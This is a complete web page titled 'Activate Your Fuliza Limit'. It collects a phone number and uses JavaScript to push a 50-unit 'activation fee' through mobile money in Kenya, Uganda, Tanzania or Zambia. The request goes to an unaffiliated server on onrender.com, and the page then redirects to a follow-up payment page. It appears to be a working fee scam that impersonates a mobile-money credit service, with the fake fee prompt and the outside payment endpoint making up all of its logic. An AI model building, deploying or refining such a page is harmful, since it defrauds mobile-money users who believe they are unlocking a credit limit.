<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Activate Your Fuliza Limit</title>
<style>
body{font-family:Arial,sans-serif;background:#f4f6f9;margin:0;}
.top-bar{background:#1fb141;padding:12px;text-align:center;color:white;font-weight:bold;font-size:18px;}
.payment-box{max-width:420px;margin:60px auto;background:white;padding:30px;border-radius:12px;box-shadow:0 6px 18px rgba(0,0,0,0.1);text-align:center;}
input{width:100%;padding:12px;margin-top:15px;border:1px solid #ddd;border-radius:6px;font-size:16px;}
.pay-btn{margin-top:20px;width:100%;padding:14px;background:#1fb141;border:none;color:white;font-size:16px;border-radius:30px;cursor:pointer;}
.pay-btn:hover{background:#179937;}
.spinner{margin-top:15px;display:none;}
.loader{border:4px solid #f3f3f3;border-top:4px solid #1fb141;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;margin:auto;}
@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
.message{margin-top:15px;font-size:14px;color:red;}
</style>
</head>
<body>

<header class="top-bar">Fuliza Activation</header>

<div class="payment-box">
<h2>Activate Your Fuliza Limit</h2>

<input type="tel" id="phone" placeholder="Enter phone number with country code (e.g. +254712345678)">

<button class="pay-btn" onclick="payNow()">Pay Now</button>

<div class="spinner" id="spinner"><div class="loader"></div></div>
<div class="message" id="message"></div>
</div>

<script>
// Supported countries
const countryPrefixes = {
  '+254': 'KE',
  '+256': 'UG',
  '+255': 'TZ',
  '+260': 'ZM'
};

// Default networks
const defaultNetwork = {
  'KE': 'MPESA',
  'UG': 'MTN',
  'TZ': 'TIGO',
  'ZM': 'ZAMTEL'
};

// Detect country from phone number
function detectCountry(number){
  for(const prefix in countryPrefixes){
    if(number.startsWith(prefix)){
      return countryPrefixes[prefix];
    }
  }
  return '';
}

async function payNow(){
  const phone = document.getElementById("phone").value.trim();
  const msg = document.getElementById("message");
  const spinner = document.getElementById("spinner");

  msg.innerText = '';

  if(!phone){
    msg.innerText = "Enter your phone number with country code";
    return;
  }

  if(!phone.startsWith('+') || phone.length < 10){
    msg.innerText = "Phone number must start with +<country code>";
    return;
  }

  const country = detectCountry(phone);
  if(!country){
    msg.innerText = "Sorry, your country is not supported for this payment";
    return;
  }

  const network = defaultNetwork[country];

  spinner.style.display = "block";
  msg.style.color = "black";
  msg.innerText = "Processing payment... check your phone";

  try{
    const res = await fetch("https://mpayafrica-server.onrender.com/deposit", {
      method: "POST",
      headers: {"Content-Type":"application/json"},
      body: JSON.stringify({
        phone_number: phone,
        amount: 50, // activation fee
        country: country,
        network: network
      })
    });

    const data = await res.json();
    spinner.style.display = "none";

    if(data.success){
      msg.style.color = "green";
      msg.innerText = "Payment request sent ✅ Enter your mobile money PIN...";
      checkPayment(data.reference, "payment2.html");
    } else {
      msg.style.color = "red";
      msg.innerText = "Payment failed: " + (data.message || "Try again");
    }

  } catch(err){
    spinner.style.display = "none";
    msg.style.color = "red";
    msg.innerText = "Server error: " + (err.message || "Try again");
  }
}

async function checkPayment(reference, nextPage){
  const msg = document.getElementById("message");
  let attempts = 0;
  const interval = setInterval(async ()=>{
    attempts++;
    if(attempts > 20){ clearInterval(interval); msg.innerText="Payment timeout. Retry later."; return; }
    try{
      const res = await fetch(`https://mpayafrica-server.onrender.com/status/${reference}`);
      const data = await res.json();
      if(data.success && data.data){
        const status = data.data.status.toLowerCase();
        if(status==="success"){
          clearInterval(interval);
          msg.style.color="green";
          msg.innerText="Payment successful ✅ Redirecting...";
          setTimeout(()=>{ window.location.href = nextPage }, 2000);
        }
        if(status==="failed" || status==="cancelled"){
          clearInterval(interval);
          msg.style.color="red";
          msg.innerText="Payment failed: " + status;
        }
      }
    } catch(e){}
  },3000);
}
</script>

</body>
</html>
